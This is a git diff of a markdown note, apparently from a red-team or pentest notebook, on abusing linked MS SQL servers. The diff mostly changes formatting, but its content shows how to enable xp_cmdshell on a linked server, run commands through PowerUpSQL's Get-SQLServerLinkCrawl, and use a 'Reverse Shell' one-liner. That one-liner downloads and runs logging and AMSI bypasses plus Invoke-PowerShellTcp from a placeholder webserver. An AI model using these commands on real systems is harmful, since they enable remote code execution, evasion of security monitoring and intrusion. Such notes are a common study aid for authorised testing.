@@ -1,5 +1,11 @@
 ---
-{"publish":true,"created":"2025-02-23T23:53:09.703+05:30","modified":"2025-08-15T16:43:40.109+05:30","published":"2025-08-15T16:43:40.109+05:30","tags":["privesc"],"cssclasses":[]}
+publish: true
+created: 2025-02-23T23:53:09.703+05:30
+modified: 2025-08-15T16:43:40.109+05:30
+published: 2025-08-15T16:43:40.109+05:30
+tags:
+  - privesc
+cssclasses: []
 ---
 
 SQL Servers
@@ -50,14 +56,14 @@ select * from openquery("sql-machine", 'select * from openquery("sql-machine-nex
 
 #### Executing Commands
 
-- On the target server, either xp_cmdshell should be already enabled; or
-- If rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
+- On the target server, either xp\_cmdshell should be already enabled; or
+- If rpcout is enabled (disabled by default), xp\_cmdshell can be enabled using:
 
 ```sql title:"Execute commands"
 EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "sql-machine"
 ```
 
-Use the -QueryTarget parameter to run Query on a specific instance (without -QuertyTarget the command tries to use xp_cmdshell on every link of the chain)
+Use the -QueryTarget parameter to run Query on a specific instance (without -QuertyTarget the command tries to use xp\_cmdshell on every link of the chain)
 
 ```powershell title:"nothing"
 Get-SQLServerLinkCrawl -Instance sql-machine-starting -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget sql-machine
@@ -70,4 +76,3 @@ select * from openquery("sql-machine",'select * from openquery("sql-machine-next
 ```powershell title:"Reverse Shell"
 Get-SQLServerLinkCrawl -Instance first-instance -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://your.webserver/sbloggingbypass.txt);iex(iwr -UseBasicParsing http://your.webserver/amsibypass);iex (iwr -UseBasicParsing http://your.webserver/Invoke-PowershellTcp.ps1);Power -Reverse -IPAddress foothold.ip -Port listening.port"''' -QueryTarget last.node
 ```
-
